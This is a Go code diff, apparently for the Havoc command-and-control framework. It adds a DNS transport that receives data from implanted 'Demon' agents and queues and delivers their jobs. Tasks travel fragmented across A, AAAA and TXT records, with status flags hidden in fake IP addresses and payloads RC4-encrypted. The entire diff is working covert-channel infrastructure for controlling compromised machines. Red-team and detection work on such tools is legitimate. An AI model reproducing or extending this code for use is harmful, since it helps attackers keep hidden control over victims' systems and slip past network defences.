+func (t *TransportDNS) computeNextExpectedOffset(fb *dnsFragBuf) uint32 {
+	if fb.chunkSize == 0 {
+		return fb.highWater
+	}
+	for off := uint32(0); off < fb.total; off += fb.chunkSize {
+		if !fb.seenOffsets[off] {
+			return off
+		}
+	}
+	return fb.total
+}
+
+func (t *TransportDNS) handleGET(req *dnsRequest, w dns.ResponseWriter) []byte {
+	decrypted := t.crypt(req.data)
+
+	var reqOffset uint32
+	if len(decrypted) >= 4 {
+		reqOffset = binary.BigEndian.Uint32(decrypted[0:4])
+	}
+
+	t.mu.Lock()
+	df, exists := t.downFrags[req.sid]
+	if exists && df != nil {
+		df.lastUpdate = time.Now()
+		if reqOffset > 0 && reqOffset <= df.total && reqOffset > df.off {
+			df.off = reqOffset
+		}
+	}
+	t.mu.Unlock()
+
+	if df == nil || df.off >= df.total {
+		if df != nil && df.off >= df.total {
+			t.mu.Lock()
+			delete(t.downFrags, req.sid)
+			t.mu.Unlock()
+		}
+		df = t.fetchTasks(req.sid)
+		if df != nil {
+			t.mu.Lock()
+			if t.downFrags == nil {
+				t.downFrags = make(map[string]*dnsDownBuf)
+			}
+			t.downFrags[req.sid] = df
+			t.mu.Unlock()
+		}
+	}
+
+	t.touchAgent(req.sid)
+
+	isTCP := w.RemoteAddr() != nil && w.RemoteAddr().Network() == "tcp"
+
+	t.mu.Lock()
+	defer t.mu.Unlock()
+	return t.buildResponseChunk(df, reqOffset, isTCP)
+}
+
+func (t *TransportDNS) handleHB(req *dnsRequest) (needsReset bool, hasPendingTasks bool) {
+	t.touchAgent(req.sid)
+
+	t.mu.Lock()
+	if t.needsReset[req.sid] {
+		needsReset = true
+		delete(t.needsReset, req.sid)
+	}
+	t.mu.Unlock()
+
+	decrypted := t.crypt(req.data)
+	var ackOffset uint32
+	if len(decrypted) >= 4 {
+		ackOffset = binary.BigEndian.Uint32(decrypted[0:4])
+	}
+
+	t.mu.Lock()
+	df, hasDf := t.downFrags[req.sid]
+	if hasDf && df != nil {
+		df.lastUpdate = time.Now()
+		if df.total > 0 && ackOffset >= df.total {
+			delete(t.downFrags, req.sid)
+			df = nil
+			hasDf = false
+		}
+	}
+	t.mu.Unlock()
+
+	if !hasDf || df == nil {
+		df = t.fetchTasks(req.sid)
+		if df != nil {
+			t.mu.Lock()
+			if t.downFrags == nil {
+				t.downFrags = make(map[string]*dnsDownBuf)
+			}
+			t.downFrags[req.sid] = df
+			t.mu.Unlock()
+			hasPendingTasks = true
+		}
+	} else {
+		hasPendingTasks = true
+	}
+
+	return needsReset, hasPendingTasks
+}
+
+func (t *TransportDNS) buildResponseChunk(df *dnsDownBuf, reqOffset uint32, isTCP bool) []byte {
+	if df == nil || df.total == 0 {
 		return nil
 	}
 
-	var parts []string
-	for len(value) > DNSTXTStringChars {
-		parts = append(parts, value[:DNSTXTStringChars])
-		value = value[DNSTXTStringChars:]
-	}
-	if value != "" {
-		parts = append(parts, value)
+	if reqOffset >= df.total {
+		reqOffset = 0
 	}
 
-	return parts
+	maxChunk := t.Config.PktSize
+	if !isTCP {
+		if maxChunk <= 0 || maxChunk > dnsSafeChunkSize {
+			maxChunk = dnsSafeChunkSize
+		}
+	} else if maxChunk <= 0 {
+		maxChunk = DNSDefaultPktSize
+	}
+
+	remaining := df.total - reqOffset
+	chunkLen := min(remaining, uint32(maxChunk))
+
+	frame := make([]byte, 8+chunkLen)
+	binary.BigEndian.PutUint32(frame[0:4], df.total)
+	binary.BigEndian.PutUint32(frame[4:8], reqOffset)
+	copy(frame[8:], df.buf[reqOffset:reqOffset+chunkLen])
+	return frame
+}
+
+func (t *TransportDNS) buildAckResponse(req *dnsRequest, ttl uint32) dns.RR {
+	switch req.qtype {
+	case dns.TypeA:
+		return &dns.A{
+			Hdr: dns.RR_Header{Name: req.qname, Rrtype: dns.TypeA, Class: dns.ClassINET, Ttl: ttl},
+			A:   net.ParseIP("127.0.0.1").To4(),
+		}
+	case dns.TypeAAAA:
+		return &dns.AAAA{
+			Hdr:  dns.RR_Header{Name: req.qname, Rrtype: dns.TypeAAAA, Class: dns.ClassINET, Ttl: ttl},
+			AAAA: net.ParseIP("::1").To16(),
+		}
+	default:
+		return &dns.TXT{
+			Hdr: dns.RR_Header{Name: req.qname, Rrtype: dns.TypeTXT, Class: dns.ClassINET, Ttl: ttl},
+			Txt: []string{"OK"},
+		}
+	}
+}
+
+func (t *TransportDNS) buildPutAckResponse(req *dnsRequest, ack putAckInfo, ttl uint32) dns.RR {
+	switch req.qtype {
+	case dns.TypeA:
+		ip := make(net.IP, 4)
+		var flags byte
+		if ack.complete {
+			flags |= 0x01
+		}
+		if ack.needsReset {
+			flags |= 0x02
+		}
+		ip[0] = flags
+		ip[1] = byte((ack.nextExpectedOff >> 16) & 0xFF)
+		ip[2] = byte((ack.nextExpectedOff >> 8) & 0xFF)
+		ip[3] = byte(ack.nextExpectedOff & 0xFF)
+		return &dns.A{
+			Hdr: dns.RR_Header{Name: req.qname, Rrtype: dns.TypeA, Class: dns.ClassINET, Ttl: ttl},
+			A:   ip,
+		}
+	case dns.TypeAAAA:
+		ip := make(net.IP, 16)
+		var flags byte
+		if ack.complete {
+			flags |= 0x01
+		}
+		if ack.needsReset {
+			flags |= 0x02
+		}
+		ip[0] = flags
+		ip[1] = byte((ack.nextExpectedOff >> 24) & 0xFF)
+		ip[2] = byte((ack.nextExpectedOff >> 16) & 0xFF)
+		ip[3] = byte((ack.nextExpectedOff >> 8) & 0xFF)
+		ip[4] = byte(ack.nextExpectedOff & 0xFF)
+		ip[5] = byte((ack.filled >> 24) & 0xFF)
+		ip[6] = byte((ack.filled >> 16) & 0xFF)
+		ip[7] = byte((ack.filled >> 8) & 0xFF)
+		ip[8] = byte(ack.filled & 0xFF)
+		return &dns.AAAA{
+			Hdr:  dns.RR_Header{Name: req.qname, Rrtype: dns.TypeAAAA, Class: dns.ClassINET, Ttl: ttl},
+			AAAA: ip,
+		}
+	default:
+		return &dns.TXT{
+			Hdr: dns.RR_Header{Name: req.qname, Rrtype: dns.TypeTXT, Class: dns.ClassINET, Ttl: ttl},
+			Txt: []string{"OK"},
+		}
+	}
+}
+
+func (t *TransportDNS) buildHBResponse(req *dnsRequest, needsReset bool, hasPendingTasks bool, ttl uint32) dns.RR {
+	switch req.qtype {
+	case dns.TypeA:
+		ip := make(net.IP, 4)
+		var flags byte
+		if hasPendingTasks {
+			flags |= 0x01
+		}
+		if needsReset {
+			flags |= 0x02
+		}
+		ip[0] = flags
+		return &dns.A{
+			Hdr: dns.RR_Header{Name: req.qname, Rrtype: dns.TypeA, Class: dns.ClassINET, Ttl: ttl},
+			A:   ip,
+		}
+	case dns.TypeAAAA:
+		ip := make(net.IP, 16)
+		var flags byte
+		if hasPendingTasks {
+			flags |= 0x01
+		}
+		if needsReset {
+			flags |= 0x02
+		}
+		ip[0] = flags
+		return &dns.AAAA{
+			Hdr:  dns.RR_Header{Name: req.qname, Rrtype: dns.TypeAAAA, Class: dns.ClassINET, Ttl: ttl},
+			AAAA: ip,
+		}
+	default:
+		return &dns.TXT{
+			Hdr: dns.RR_Header{Name: req.qname, Rrtype: dns.TypeTXT, Class: dns.ClassINET, Ttl: ttl},
+			Txt: []string{"OK"},
+		}
+	}
+}
+
+func (t *TransportDNS) buildDataResponse(req *dnsRequest, frame []byte, ttl uint32) dns.RR {
+	if len(frame) == 0 {
+		return &dns.TXT{
+			Hdr: dns.RR_Header{Name: req.qname, Rrtype: dns.TypeTXT, Class: dns.ClassINET, Ttl: ttl},
+			Txt: []string{""},
+		}
+	}
+
+	encrypted := t.crypt(frame)
+	b64 := base64.StdEncoding.EncodeToString(encrypted)
+
+	var chunks []string
+	for len(b64) > 255 {
+		chunks = append(chunks, b64[:255])
+		b64 = b64[255:]
+	}
+	chunks = append(chunks, b64)
+
+	return &dns.TXT{
+		Hdr: dns.RR_Header{Name: req.qname, Rrtype: dns.TypeTXT, Class: dns.ClassINET, Ttl: ttl},
+		Txt: chunks,
+	}
+}
+
+// fetchTasks is Havoc's equivalent of AdaptixC2's TsAgentGetHostedAll: it
+// asks the normal request parser for the agent's queued jobs by sending a
+// synthetic DEMON_COMMAND_GET_JOB package for that agent.
+func (t *TransportDNS) fetchTasks(sid string) *dnsDownBuf {
+	if t.Teamserver == nil {
+		return nil
+	}
+
+	id, err := strconv.ParseUint(sid, 16, 32)
+	if err != nil || !t.Teamserver.AgentExist(int(id)) {
+		return nil
+	}
+
+	// Agent packages are big endian: [size][magic][agent id][command][request id].
+	pkg := make([]byte, 20)
+	binary.BigEndian.PutUint32(pkg[0:4], uint32(len(pkg)-4))
+	binary.BigEndian.PutUint32(pkg[4:8], uint32(agent.DEMON_MAGIC_VALUE))
+	binary.BigEndian.PutUint32(pkg[8:12], uint32(id))
+	binary.BigEndian.PutUint32(pkg[12:16], uint32(agent.COMMAND_GET_JOB))
+	binary.BigEndian.PutUint32(pkg[16:20], 0)
+
+	response, ok := parseAgentRequest(t.Teamserver, pkg, "")
+	if !ok || response.Len() == 0 {
+		return nil
+	}
+	return newDownBuf(response.Bytes(), 0)
+}
+
+func (t *TransportDNS) processAgentData(sid string, data []byte, externalIP string) []byte {
+	if t.Teamserver == nil || len(data) == 0 {
+		return nil
+	}
+	response, ok := parseAgentRequest(t.Teamserver, data, externalIP)
+	if !ok {
+		logger.Warn("Failed to parse agent request of session " + sid + " over DNS")
+		return nil
+	}
+	return response.Bytes()
+}
+
+func (t *TransportDNS) storeResponse(sid string, response []byte) {
+	if sid == "" || len(response) == 0 {
+		return
+	}
+	t.mu.Lock()
+	if t.downFrags == nil {
+		t.downFrags = make(map[string]*dnsDownBuf)
+	}
+	t.downFrags[sid] = newDownBuf(response, 0)
+	t.mu.Unlock()
+}
+
+func (t *TransportDNS) touchAgent(sid string) {
+	if t.Teamserver == nil || sid == "" {
+		return
+	}
+	id, err := strconv.ParseUint(sid, 16, 32)
+	if err != nil {
+		return
+	}
+	if instance := t.Teamserver.AgentInstance(int(id)); instance != nil {
+		instance.UpdateLastCallback(t.Teamserver)
+	}
+}
+
+func (t *TransportDNS) crypt(data []byte) []byte {
+	if len(data) == 0 {
+		return data
+	}
+	key, err := rc4Key(t.Config.EncryptKey)
+	if err != nil {
+		return data
+	}
+	cipher, err := rc4.NewCipher(key)
+	if err != nil {
+		return data
+	}
+	out := make([]byte, len(data))
+	cipher.XORKeyStream(out, data)
+	return out
+}
+
+func rc4Key(value string) ([]byte, error) {
+	key, err := hex.DecodeString(strings.TrimSpace(value))
+	if err == nil && len(key) == 16 {
+		return key, nil
+	}
+	if len(value) == 16 {
+		return []byte(value), nil
+	}
+	return nil, fmt.Errorf("dns encrypt_key must be a 16-byte hex string")
+}
+
+// DNSCryptKey returns the 16 byte RC4 key of a DNS listener configuration.
+// The key is shared with the agent, so the same parsing rules apply on both
+// sides of the wire.
+func DNSCryptKey(value string) ([]byte, error) {
+	return rc4Key(value)
+}
+
+func isHavocPackage(data []byte) bool {
+	return len(data) >= 12 && binary.BigEndian.Uint32(data[4:8]) == uint32(agent.DEMON_MAGIC_VALUE)
+}
+
+func remoteIP(w dns.ResponseWriter) string {
+	if w == nil || w.RemoteAddr() == nil {
+		return ""
+	}
+	host, _, err := net.SplitHostPort(w.RemoteAddr().String())
+	if err == nil {
+		return host
+	}
+	return w.RemoteAddr().String()
 }
